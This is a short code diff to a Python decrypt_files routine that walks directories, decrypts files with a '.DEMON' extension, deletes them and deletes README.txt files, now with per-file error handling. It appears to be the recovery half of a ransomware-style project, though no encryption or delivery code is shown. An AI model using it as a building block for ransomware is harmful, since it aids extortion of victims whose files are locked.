@@ -39,16 +39,20 @@ def decrypt_files():
           counter = 0
           for path, subdirs, files in os.walk(p):
               for name in files:
-                  if name.endswith(".DEMON"):
-                      decrypt_file(os.path.join(path, name), key)
-                      os.remove(os.path.join(path, name))
-                      print("[Decrypted] %s" % name)
-                      counter+=1
-                  elif name == 'README.txt':
-                      os.remove(os.path.join(path, name))
-                      print('[DELETED] %s/%s' % (path, name))
-                  else:
-                      print("[Skipped] %s" % name)
+                  try:
+                      if name.endswith(".DEMON"):
+                          decrypt_file(os.path.join(path, name), key)
+                          os.remove(os.path.join(path, name))
+                          print("[Decrypted] %s" % name)
+                          counter+=1
+                      elif name == 'README.txt':
+                          os.remove(os.path.join(path, name))
+                          print('[DELETED] %s/%s' % (path, name))
+                      else:
+                          print("[Skipped] %s" % name)
+                  except Exception as e:
+                      print('[ERROR] %s' % e); pass
+
           print("\\n[DONE] Decrypted %i files" % counter)
 
       except KeyboardInterrupt:
